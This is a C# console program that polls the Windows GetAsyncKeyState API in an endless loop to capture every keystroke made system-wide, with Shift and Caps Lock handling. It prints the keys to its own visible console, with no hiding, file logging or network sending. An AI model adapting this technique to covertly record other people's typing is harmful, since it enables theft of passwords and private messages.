using System;
using System.Runtime.InteropServices;

namespace z1
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);
        static void Main(string[] args)
        {
            bool Shift = false;
            while (true)
            {
                for (int i = 8; i < 255; i++)
                {
                    if (GetAsyncKeyState(16) == -32769 || GetAsyncKeyState(16) == -32768)
                    {                   
                      int state = GetAsyncKeyState(i);              
                      if (state == 32769)
                      {
                            if (i >= 65 && i <= 90)
                            {
                                if (!Console.CapsLock) Console.Write("{0} ", Convert.ToChar(i));
                                else Console.Write("{0} ", Convert.ToChar(i + 32));
                            }
                            else
                            {
                                switch (i)
                                {
                                    case 48 :
                                        Console.Write(") ");
                                        break;
                                    case 49:
                                        Console.Write("! ");
                                        break;
                                    case 50:
                                        Console.Write("@ ");
                                        break;
                                    case 51:
                                        Console.Write("# ");
                                        break;
                                    case 52:
                                        Console.Write("$ ");
                                        break;
                                    case 53:
                                        Console.Write("% ");
                                        break;
                                    case 54:
                                        Console.Write("^ ");
                                        break;
                                    case 55:
                                        Console.Write("& ");
                                        break;
                                    case 56:
                                        Console.Write("* ");
                                        break;
                                    case 57:
                                        Console.Write("( ");
                                        break;
                                    case 27:
                                        Console.Write("Esc ");
                                        break;
                                    case 192:
                                        Console.Write("~ ");
                                        break;
                                    case 9:
                                        Console.Write("Tab ");
                                        break;
                                    case 20:
                                        Console.Write("CapsLk ");
                                        break;
                                    case 162:
                                        Console.Write("LCtrl ");
                                        break;
                                    case 91:
                                        Console.Write("Win ");
                                        break;
                                    case 164:
                                        Console.Write("LAlt ");
                                        break;
                                    case 32:
                                        Console.Write("Space ");
                                        break;
                                    case 165:
                                        Console.Write("RAlt ");
                                        break;
                                    case 163:
                                        Console.Write("RCtrl ");
                                        break;
                                    case 37:
                                        Console.Write("pgLeft ");
                                        break;
                                    case 38:
                                        Console.Write("pgUp ");
                                        break;
                                    case 39:
                                        Console.Write("pgRight ");
                                        break;
                                    case 40:
                                        Console.Write("pgDown ");
                                        break;
                                    case 13:
                                        Console.Write("Enter ");
                                        break;
                                    case 8:
                                        Console.Write("Backspace ");
                                        break;
                                    case 46:
                                        Console.Write("Delete ");
                                        break;
                                    case 44:
                                        Console.Write("PrtSc ");
                                        break;
                                    case 45:
                                        Console.Write("Insert ");
                                        break;
                                    case 189:
                                        Console.Write("_ ");
                                        break;
                                    case 187:
                                        Console.Write("+ ");
                                        break;
                                    case 219:
                                        Console.Write("{ ");
                                        break;
                                    case 221:
                                        Console.Write("} ");
                                        break;
                                    case 220:
                                        Console.Write("| ");
                                        break;
                                    case 186:
                                        Console.Write(": ");
                                        break;
                                    case 222:
                                        Console.Write('"' + " ");
                                        break;
                                    case 188:
                                        Console.Write("< ");
                                        break;
                                    case 190:
                                        Console.Write("> ");
                                        break;
                                    case 191:
                                        Console.Write("? ");
                                        break;
                                    case 160:
                                        if (!Shift)
                                        {
                                            Shift = true;
                                            Console.Write("LShift ");                                            
                                        }
                                        break;
                                    case 161:
                                        if (!Shift)
                                        {   
                                            Shift = true;
                                            Console.Write("RShift ");                                           
                                        }
                                        break;
                                }
                            }

                        }
                    }

                    else
                    {
                        Shift = false;
                        int state = GetAsyncKeyState(i);
                        if (state == 32769)
                        {
                            if(i >= 65 && i <= 90)
                            {
                                if (!Console.CapsLock) Console.Write("{0} ", Convert.ToChar(i + 32));
                                else Console.Write("{0} ", Convert.ToChar(i));
                            }
                            else if (i >= 48 && i <= 57) Console.Write("{0} ", Convert.ToChar(i));

                            else
                            {
                                switch (i)
                                {
                                    case 27:
                                        Console.Write("Esc ");
                                        break;
                                    case 192:
                                        Console.Write("` ");
                                        break;
                                    case 9:
                                        Console.Write("Tab ");
                                        break;
                                    case 20:
                                        Console.Write("CapsLk ");
                                        break;
                                    case 162:
                                        Console.Write("LCtrl ");
                                        break;
                                    case 91:
                                        Console.Write("Win ");
                                        break;
                                    case 164:
                                        Console.Write("LAlt ");
                                        break;
                                    case 32:
                                        Console.Write("Space ");
                                        break;
                                    case 165:
                                        Console.Write("RAlt ");
                                        break;
                                    case 163:
                                        Console.Write("RCtrl ");
                                        break;
                                    case 37:
                                        Console.Write("pgLeft ");
                                        break;
                                    case 38:
                                        Console.Write("pgUp ");
                                        break;
                                    case 39:
                                        Console.Write("pgRight ");
                                        break;
                                    case 40:
                                        Console.Write("pgDown ");
                                        break;
                                    case 13:
                                        Console.Write("Enter ");
                                        break;
                                    case 8:
                                        Console.Write("Backspace ");
                                        break;
                                    case 46:
                                        Console.Write("Delete ");
                                        break;
                                    case 44:
                                        Console.Write("PrtSc ");
                                        break;
                                    case 45:
                                        Console.Write("Insert ");
                                        break;
                                    case 189:
                                        Console.Write("- ");
                                        break;
                                    case 187:
                                        Console.Write("= ");
                                        break;
                                    case 219:
                                        Console.Write("[ ");
                                        break;
                                    case 221:
                                        Console.Write("] ");
                                        break;
                                    case 220:
                                        Console.Write("\\ ");
                                        break;
                                    case 186:
                                        Console.Write("; ");
                                        break;
                                    case 222:
                                        Console.Write("' ");
                                        break;
                                    case 188:
                                        Console.Write(", ");
                                        break;
                                    case 190:
                                        Console.Write(". ");
                                        break;
                                    case 191:
                                        Console.Write("/ ");
                                        break;

                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
